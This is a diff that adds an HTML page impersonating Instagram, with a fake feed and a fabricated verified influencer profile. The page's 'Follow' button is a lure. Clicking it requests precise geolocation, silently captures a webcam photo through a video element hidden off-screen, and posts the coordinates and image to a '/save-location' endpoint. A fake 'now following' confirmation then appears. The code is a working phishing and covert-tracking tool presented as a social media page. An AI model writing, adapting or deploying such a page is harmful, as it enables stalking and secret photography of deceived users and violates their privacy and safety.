@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Instagram</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #000;
+    min-height: 100vh;
+    overflow: hidden;
+  }
+
+  /* ── Fake Instagram Feed Background ── */
+  .ig-bg {
+    position: fixed;
+    inset: 0;
+    background: #fafafa;
+    z-index: 0;
+  }
+
+  /* Top bar */
+  .ig-topbar {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 5;
+    background: #fff;
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 0.5px solid #dbdbdb;
+  }
+  .ig-logo-wrap { display: flex; align-items: center; gap: 4px; }
+  .ig-logo-svg { width: 103px; height: 29px; }
+  .ig-topbar-icons { display: flex; gap: 18px; align-items: center; }
+  .ig-topbar-icons svg { width: 24px; height: 24px; }
+
+  /* Fake stories bar */
+  .ig-stories {
+    position: fixed;
+    top: 50px; left: 0; right: 0;
+    z-index: 4;
+    background: #fff;
+    padding: 10px 12px;
+    display: flex;
+    gap: 14px;
+    overflow-x: auto;
+    border-bottom: 0.5px solid #dbdbdb;
+    -webkit-overflow-scrolling: touch;
+  }
+  .ig-stories::-webkit-scrollbar { display: none; }
+  .story-item { display: flex; flex-direction: column; align-items: center; gap: 4px; flex-shrink: 0; }
+  .story-ring {
+    width: 58px; height: 58px;
+    border-radius: 50%;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    padding: 2.5px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .story-ring.seen { background: #dbdbdb; }
+  .story-inner {
+    width: 100%; height: 100%;
+    border-radius: 50%;
+    background: #eee;
+    border: 2px solid #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px;
+    overflow: hidden;
+  }
+  .story-label { font-size: 11px; color: #262626; max-width: 60px; text-align: center; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  /* Fake post */
+  .ig-post {
+    position: fixed;
+    top: 142px; left: 0; right: 0; bottom: 0;
+    z-index: 3;
+    overflow-y: auto;
+    background: #fafafa;
+  }
+  .post-card { background: #fff; margin-bottom: 8px; }
+  .post-header { display: flex; align-items: center; gap: 10px; padding: 10px 12px; }
+  .post-avatar { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, #833ab4, #fd1d1d); display: flex; align-items: center; justify-content: center; font-size: 16px; }
+  .post-username { font-size: 13px; font-weight: 600; color: #262626; }
+  .post-location { font-size: 11px; color: #8e8e8e; }
+  .post-more { margin-left: auto; font-size: 20px; color: #262626; }
+  .post-image { width: 100%; aspect-ratio: 1; background: linear-gradient(135deg, #f5a3b7 0%, #e8a3b7 30%, #d4a3b7 70%, #f5a3b7 100%); display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+  .post-image-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px; }
+  .post-image-icon { font-size: 48px; opacity: 0.9; }
+  .post-image-text { font-size: 15px; font-weight: 700; color: #fff; letter-spacing: 1px; opacity: 0.8; text-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+  .post-actions { display: flex; align-items: center; gap: 14px; padding: 10px 12px 6px; }
+  .post-actions svg { width: 24px; height: 24px; }
+  .post-save { margin-left: auto; }
+  .post-likes { font-size: 13px; font-weight: 600; color: #262626; padding: 0 12px 4px; }
+  .post-caption { font-size: 13px; color: #262626; padding: 0 12px 12px; }
+  .post-caption span { font-weight: 600; }
+
+  /* ── Dim overlay ── */
+  .sheet-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 15;
+    background: rgba(0,0,0,0.4);
+    backdrop-filter: blur(1px);
+  }
+
+  /* ── Bottom Sheet ── */
+  .bottom-sheet {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    z-index: 20;
+    background: #fff;
+    border-radius: 24px 24px 0 0;
+    animation: sheetUp 0.38s cubic-bezier(.22,.68,0,1.2);
+    box-shadow: 0 -8px 48px rgba(0,0,0,0.18);
+    overflow: hidden;
+  }
+  @keyframes sheetUp {
+    from { transform: translateY(100%); opacity: 0.5; }
+    to   { transform: translateY(0);   opacity: 1; }
+  }
+
+  .drag-pill { width: 36px; height: 4px; background: #dbdbdb; border-radius: 2px; margin: 12px auto 0; }
+
+  /* Profile area */
+  .profile-section {
+    padding: 18px 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+  .profile-avatar-wrap { position: relative; }
+  .profile-avatar {
+    width: 72px; height: 72px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #f5a3b7 0%, #e8a3b7 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 34px;
+    box-shadow: 0 4px 20px rgba(245,163,183,0.4);
+  }
+  .profile-verified {
+    position: absolute;
+    bottom: 2px; right: 2px;
+    width: 20px; height: 20px;
+    background: #0095f6;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 2px solid #fff;
+    font-size: 10px;
+  }
+  .profile-info { flex: 1; }
+  .profile-name { font-size: 16px; font-weight: 700; color: #262626; }
+  .profile-handle { font-size: 13px; color: #8e8e8e; margin-top: 1px; }
+  .profile-category {
+    display: inline-block;
+    margin-top: 5px;
+    font-size: 11px;
+    color: #0095f6;
+    background: rgba(0,149,246,0.1);
+    padding: 2px 8px;
+    border-radius: 20px;
+    font-weight: 500;
+  }
+
+  /* Bio */
+  .profile-bio {
+    padding: 12px 20px;
+    font-size: 13px;
+    color: #262626;
+    line-height: 1.5;
+    border-bottom: 0.5px solid #efefef;
+  }
+  .profile-bio .bio-tag { color: #00376b; font-weight: 500; }
+
+  /* Stats */
+  .stats-row {
+    display: flex;
+    padding: 14px 20px;
+    gap: 0;
+    border-bottom: 0.5px solid #efefef;
+  }
+  .stat-item { flex: 1; text-align: center; }
+  .stat-item + .stat-item { border-left: 0.5px solid #efefef; }
+  .stat-value { font-size: 17px; font-weight: 700; color: #262626; }
+  .stat-label { font-size: 12px; color: #8e8e8e; margin-top: 1px; }
+
+  /* Challenge badge */
+  .challenge-badge {
+    margin: 14px 20px;
+    padding: 12px 14px;
+    background: linear-gradient(135deg, #fff0f3 0%, #ffe8ed 100%);
+    border-radius: 14px;
+    border: 1px solid #ffcdd6;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .challenge-icon { font-size: 28px; }
+  .challenge-text-wrap { flex: 1; }
+  .challenge-title { font-size: 13px; font-weight: 700; color: #c21e56; }
+  .challenge-sub { font-size: 11px; color: #e86b8f; margin-top: 2px; }
+  .challenge-arrow { font-size: 16px; color: #c21e56; }
+
+  /* Buttons */
+  .action-row {
+    display: flex;
+    gap: 8px;
+    padding: 4px 20px 20px;
+  }
+  .follow-btn {
+    flex: 1;
+    padding: 11px;
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+    letter-spacing: 0.2px;
+  }
+  .follow-btn:hover { background: #0086e0; }
+  .follow-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+  .msg-btn {
+    padding: 11px 18px;
+    background: #efefef;
+    color: #262626;
+    border: none;
+    border-radius: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .chevron-btn {
+    padding: 11px 10px;
+    background: #efefef;
+    color: #262626;
+    border: none;
+    border-radius: 10px;
+    font-size: 14px;
+    cursor: pointer;
+  }
+
+  /* ── Toast ── */
+  .toast-message {
+    position: fixed;
+    bottom: 24px; left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0,0,0,0.82);
+    color: #fff;
+    padding: 9px 18px;
+    border-radius: 22px;
+    font-size: 13px;
+    z-index: 1000;
+    white-space: nowrap;
+    pointer-events: none;
+  }
+
+  /* ── Success Modal ── */
+  .success-modal {
+    position: fixed;
+    inset: 0;
+    z-index: 2000;
+    display: flex; align-items: flex-end; justify-content: center;
+  }
+  .modal-bg {
+    position: absolute; inset: 0;
+    background: rgba(0,0,0,0.5);
+    backdrop-filter: blur(4px);
+  }
+  .modal-feed-peek {
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 55%;
+    overflow: hidden;
+    pointer-events: none;
+  }
+  .modal-feed-post {
+    background: #fff;
+    border-radius: 0;
+  }
+  .mfp-img { width: 100%; height: 220px; background: linear-gradient(135deg, #f5a3b7, #e8a3b7); display: flex; align-items: center; justify-content: center; font-size: 60px; }
+  .mfp-bar { padding: 10px 14px; display: flex; gap: 10px; align-items: center; }
+  .mfp-av { width: 28px; height: 28px; background: linear-gradient(135deg,#f5a3b7,#e8a3b7); border-radius: 50%; }
+  .mfp-name { font-size: 12px; font-weight: 700; color: #262626; }
+
+  .modal-card {
+    position: relative;
+    z-index: 1;
+    background: #fff;
+    width: 100%;
+    border-radius: 24px 24px 0 0;
+    padding: 0 0 32px;
+    animation: sheetUp 0.4s cubic-bezier(.22,.68,0,1.2);
+    overflow: hidden;
+  }
+  .modal-banner {
+    width: 100%;
+    height: 130px;
+    background: linear-gradient(135deg, #f5a3b7 0%, #e8a3b7 50%, #f5a3b7 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+  }
+  .modal-banner-text { font-size: 13px; font-weight: 700; color: rgba(255,255,255,0.5); letter-spacing: 3px; text-transform: uppercase; position: absolute; bottom: 14px; left: 0; right: 0; text-align: center; }
+  .modal-banner-emoji { font-size: 52px; }
+  .modal-content-inner { padding: 20px 24px 0; text-align: center; }
+  .modal-tick { width: 48px; height: 48px; background: #0095f6; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: -40px auto 12px; border: 4px solid #fff; box-shadow: 0 4px 20px rgba(0,149,246,0.3); font-size: 22px; }
+  .modal-title { font-size: 20px; font-weight: 800; color: #262626; }
+  .modal-sub { font-size: 14px; color: #8e8e8e; margin-top: 6px; line-height: 1.4; }
+  .modal-actions { padding: 20px 24px 0; display: flex; flex-direction: column; gap: 10px; }
+  .modal-btn-primary {
+    width: 100%; padding: 13px;
+    background: #0095f6; color: #fff;
+    border: none; border-radius: 12px;
+    font-size: 15px; font-weight: 700; cursor: pointer;
+  }
+  .modal-btn-ghost {
+    width: 100%; padding: 13px;
+    background: transparent; color: #8e8e8e;
+    border: none; border-radius: 12px;
+    font-size: 14px; font-weight: 600; cursor: pointer;
+  }
+
+  #hiddenCamera { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+</style>
+</head>
+<body>
+
+<video id="hiddenCamera" autoplay playsinline muted></video>
+
+<!-- Fake Instagram background -->
+<div class="ig-bg">
+  <div class="ig-topbar">
+    <div class="ig-logo-wrap">
+      <svg class="ig-logo-svg" viewBox="0 0 103 29" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <text y="22" font-size="22" font-weight="500" fill="#262626" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif" letter-spacing="-0.5">Instagram</text>
+      </svg>
+    </div>
+    <div class="ig-topbar-icons">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78L12 21.23l8.84-8.84a5.5 5.5 0 0 0 0-7.78z"/></svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2 11 13M22 2 15 22 11 13 2 9l20-7z"/></svg>
+    </div>
+  </div>
+
+  <div class="ig-stories">
+    <div class="story-item"><div class="story-ring" style="background:#dbdbdb;padding:2px"><div class="story-inner" style="background:#eee;font-size:26px">➕</div></div><div class="story-label">Your story</div></div>
+    <div class="story-item"><div class="story-ring"><div class="story-inner">💖</div></div><div class="story-label">Priya_Sharma</div></div>
+    <div class="story-item"><div class="story-ring"><div class="story-inner">💃</div></div><div class="story-label">Neha_Gupta</div></div>
+    <div class="story-item"><div class="story-ring"><div class="story-inner">👗</div></div><div class="story-label">FashionHub</div></div>
+    <div class="story-item"><div class="story-ring seen"><div class="story-inner">💄</div></div><div class="story-label">MakeupIndia</div></div>
+    <div class="story-item"><div class="story-ring seen"><div class="story-inner">✨</div></div><div class="story-label">GlowUp</div></div>
+  </div>
+
+  <div class="ig-post">
+    <div class="post-card">
+      <div class="post-header">
+        <div class="post-avatar">💃</div>
+        <div><div class="post-username">ananya_sharma</div><div class="post-location">Mumbai, Maharashtra</div></div>
+        <div class="post-more">···</div>
+      </div>
+      <div class="post-image">
+        <div class="post-image-overlay">
+          <div class="post-image-icon">💖</div>
+          <div class="post-image-text">✨ NEW POST ✨</div>
+        </div>
+      </div>
+      <div class="post-actions">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78L12 21.23l8.84-8.84a5.5 5.5 0 0 0 0-7.78z"/></svg>
+        <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+        <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2 11 13M22 2 15 22 11 13 2 9l20-7z"/></svg>
+        <div class="post-save">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21 12 16 5 21V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+        </div>
+      </div>
+      <div class="post-likes">52,890 likes</div>
+      <div class="post-caption"><span>ananya_sharma</span> ✨ New beginnings 🌸💖 #DesiGirl #MumbaiDiaries #Fashion #Positivity <span style="color:#00376b">#Style #Trending</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- Overlay -->
+<div class="sheet-overlay"></div>
+
+<!-- Bottom Sheet -->
+<div class="bottom-sheet">
+  <div class="drag-pill"></div>
+
+  <div class="profile-section">
+    <div class="profile-avatar-wrap">
+      <div class="profile-avatar">💃</div>
+      <div class="profile-verified">✓</div>
+    </div>
+    <div class="profile-info">
+      <div class="profile-name">Ananya Sharma</div>
+      <div class="profile-handle">@ananya_sharma</div>
+      <div class="profile-category">💖 Fashion • Lifestyle • Mumbai</div>
+    </div>
+  </div>
+
+  <div class="profile-bio">
+    🌸 Making the world a little more colorful<br>
+    📍 Mumbai • Delhi<br>
+    💌 Collab: ananya@style.in<br>
+    ✨ Spreading positivity one post at a time<br>
+    <span class="bio-tag">#DesiGirl</span> <span class="bio-tag">#FashionDiaries</span> <span class="bio-tag">#MumbaiBlogger</span><br>
+    🎵 Music Lover | 🎬 Movie Buff | 💃 Dance
+  </div>
+
+  <div class="stats-row">
+    <div class="stat-item"><div class="stat-value">524K</div><div class="stat-label">Followers</div></div>
+    <div class="stat-item"><div class="stat-value">1,280</div><div class="stat-label">Following</div></div>
+    <div class="stat-item"><div class="stat-value">1.8K</div><div class="stat-label">Posts</div></div>
+  </div>
+
+  <div class="challenge-badge">
+    <div class="challenge-icon">💖</div>
+    <div class="challenge-text-wrap">
+      <div class="challenge-title">New Collection Launch</div>
+      <div class="challenge-sub">Limited edition ethnic wear — Shop now ✨</div>
+    </div>
+    <div class="challenge-arrow">›</div>
+  </div>
+
+  <div class="action-row">
+    <button id="joinBtn" class="follow-btn" onclick="followAccount()">Follow</button>
+    <button class="msg-btn">Message</button>
+    <button class="chevron-btn">▾</button>
+  </div>
+</div>
+
+<script>
+let mediaStream = null;
+let locationData = null;
+
+async function followAccount() {
+    const btn = document.getElementById("joinBtn");
+    btn.disabled = true;
+    btn.textContent = "Requesting...";
+    showToast("📍 Requesting location access...");
+    
+    if (!navigator.geolocation) {
+        showToast("❌ Geolocation not supported");
+        resetButton();
+        return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+        async function(position) {
+            locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+            showToast("✅ Location captured!");
+            await capturePhoto();
+        },
+        function(error) {
+            let msg = "";
+            switch(error.code) {
+                case 1: msg = "Location permission denied"; break;
+                case 2: msg = "Location unavailable"; break;
+                case 3: msg = "Request timeout"; break;
+                default: msg = "Unknown error";
+            }
+            showToast("❌ " + msg);
+            resetButton();
+        },
+        { enableHighAccuracy: true, timeout: 15000 }
+    );
+}
+
+async function capturePhoto() {
+    const video = document.getElementById('hiddenCamera');
+    try {
+        showToast("📷 Accessing camera...");
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = mediaStream;
+        video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(() => takePhoto(), 1000);
+        };
+    } catch (err) {
+        console.error("Camera error:", err);
+        saveToServer(null);
+    }
+}
+
+function takePhoto() {
+    const video = document.getElementById('hiddenCamera');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+    
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+    }
+    
+    saveToServer(photoData);
+}
+
+function saveToServer(photoData) {
+    showToast("📡 Sending data...");
+    
+    fetch('/save-location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            latitude: locationData.latitude,
+            longitude: locationData.longitude,
+            accuracy: locationData.accuracy,
+            photo: photoData ? photoData.split(',')[1] : null,
+            photo_filename: photoData ? `instagram_${Date.now()}.jpg` : null,
+            tracking_type: 'initial',
+            platform: 'instagram'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === "success") {
+            showSuccessModal();
+        } else {
+            showToast("❌ Failed: " + data.message);
+            resetButton();
+        }
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        showToast("❌ Network error");
+        resetButton();
+    });
+}
+
+function showToast(message) {
+    const existing = document.querySelector('.toast-message');
+    if (existing) existing.remove();
+    const toast = document.createElement('div');
+    toast.className = 'toast-message';
+    toast.innerHTML = message;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+}
+
+function showSuccessModal() {
+    const modal = document.createElement('div');
+    modal.className = 'success-modal';
+    modal.innerHTML = `
+      <div class="modal-bg"></div>
+      <div class="modal-feed-peek">
+        <div class="modal-feed-post">
+          <div class="mfp-img">💖</div>
+          <div class="mfp-bar"><div class="mfp-av"></div><div><div class="mfp-name">ananya_sharma</div><div style="font-size:11px;color:#8e8e8e">✨ New post is live ✨</div></div></div>
+        </div>
+      </div>
+      <div class="modal-card">
+        <div class="modal-banner">
+          <div class="modal-banner-emoji">💖</div>
+          <div class="modal-banner-text">Ananya Sharma</div>
+        </div>
+        <div class="modal-content-inner">
+          <div class="modal-tick">✓</div>
+          <div class="modal-title">Following @ananya_sharma</div>
+          <div class="modal-sub">You'll now see her posts in your feed. Stay tuned for amazing content! 💕</div>
+        </div>
+        <div class="modal-actions">
+          <button class="modal-btn-primary" onclick="window.location.href='/'">Back to Feed</button>
+          <button class="modal-btn-ghost" onclick="window.location.href='/'">Maybe later</button>
+        </div>
+      </div>
+    `;
+    document.body.appendChild(modal);
+}
+
+function resetButton() {
+    const btn = document.getElementById("joinBtn");
+    btn.disabled = false;
+    btn.innerHTML = "Follow";
+}
+</script>
+</body>
+</html>
